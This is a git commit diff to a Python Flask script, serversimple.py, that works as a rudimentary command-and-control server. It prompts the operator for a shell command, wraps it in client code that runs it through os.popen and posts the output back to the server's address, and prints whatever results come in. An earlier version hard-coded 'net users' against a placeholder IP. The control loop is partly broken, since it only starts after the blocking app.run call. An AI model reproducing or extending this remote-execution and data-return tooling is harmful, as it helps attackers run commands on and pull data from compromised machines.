e9d14d363a57e4afda69ee742579623876dd2cde
Martian1337 <73861544+Martian1337@users.noreply.github.com>
2023-01-02 17:36:49 -0600

    Update serversimple.py

--- Python/serversimple.py
+++ Python/serversimple.py
@@ -1,8 +1,6 @@
 import os
-import hashlib
 import requests
-from flask import request
-from flask import Flask, jsonify
+from flask import Flask, request, jsonify
 
 # Directory where the server's assets are stored
 ASSETS_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -10,45 +8,51 @@ ASSETS_DIR = os.path.dirname(os.path.abspath(__file__))
 # Create a Flask app
 app = Flask(__name__)
 
-# Flag to track whether the command has been executed
-ran = False
+# Prompt the user for the server address and port
+server_address = input("Enter the server address: ")
+server_port = input("Enter the server port: ")
 
-@app.route('/', methods=['GET'])
-def main_get():
-    """Endpoint for handling GET requests."""
-    global ran
+# Construct the full URL for the server
+server_url = f'http://{server_address}:{server_port}/'
 
-    # Return an empty response if the command has already been executed
-    if ran:
-        return jsonify({})
+def generate_command(server_url):
+    """Generate the command to be executed by the client."""
+    # Prompt the user for the command to be executed by the client
+    command_str = input("Enter the command to be executed by the client: ")
 
-    # Construct the command to be executed by the client
-    command = """
+    # Generate the command to be executed by the client
+    command = f"""
     import requests
     import os
 
-    # Replace these with the actual server address and port
-    server_address = '<YOUR_SERVER_IP_HERE>'
-    server_port = '<YOUR_SERVER_PORT_HERE>'
-
-    # Construct the full URL for the server
-    url = f'https://{server_address}:{server_port}/'
-
-    # Execute the 'net users' command and store the output
-    stream = os.popen('net users')
+    # Execute the '{command_str}' command and store the output
+    stream = os.popen('{command_str}')
     output = stream.read()
 
     # Send the output back to the server
-    data = {'result': output}
-    requests.post(url, json=data)
+    data = {{'result': output}}
+    requests.post('{server_url}', json=data)
     """
-
-    # Set the flag to indicate that the command has been executed
-    ran = True
-
-    # Return the command in the response
-    return jsonify({'command': command})
+    return command
 
 @app.route('/', methods=['POST'])
-def main_post():
+def handle_post_request():
     """Endpoint for handling POST requests."""
+    # Retrieve the 'result' field from the request body
+    result = request.json['result']
+
+    # Display the result
+    print(result)
+    return jsonify({})
+
+if __name__ == '__main__':
+    # Run the server
+    app.run(host='0.0.0.0', port=server_port, debug=True)
+
+    # Enter an infinite loop to accept commands from the user
+    while True:
+        # Generate the command to be executed by the client
+        command = generate_command(server_url)
+
+        # Send the command to the client
+        requests.post(server_url, json={'command': command})
